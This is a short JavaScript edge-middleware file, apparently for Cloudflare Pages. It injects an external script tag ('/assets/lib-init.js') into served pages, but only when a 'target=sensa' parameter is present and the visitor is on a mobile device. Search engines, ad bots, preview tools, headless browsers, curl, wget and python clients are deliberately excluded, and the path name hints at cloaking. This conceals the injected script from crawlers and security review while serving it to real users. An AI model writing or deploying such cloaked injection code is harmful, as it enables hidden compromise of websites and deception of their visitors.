export async function onRequest(context) {
  const { request, next } = context;
  const url = new URL(request.url);
  if (url.pathname.startsWith('/assets-kloning/') || url.pathname.startsWith('/assets/')) {
    return next();
  }
  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
  const asOrganization = request.cf ? request.cf.asOrganization : '';
  const targetKey = url.searchParams.get('target');
  if (targetKey !== 'sensa') {
    return next();
  }
  const botList = /bot|spider|crawl|facebook|google|bing|slurp|yandex|adsbot|tiktok|bytedance|lighthouse|vision|petalinux|headless|linux|python|wget|curl|screenshot|preview|mediapartners|dubbin|monit/i;
  if (botList.test(userAgent)) {
    return next();
  }
  const isMobile = /android|iphone|ipad|mobile/i.test(userAgent);
  if (!isMobile) {
    return next();
  }
  const response = await next();
  return new HTMLRewriter()
    .on('body', {
      element(el) {
        el.append(`
          <script src="/assets/lib-init.js" defer></script>
        `, { html: true });
      },
    })
    .transform(response);
}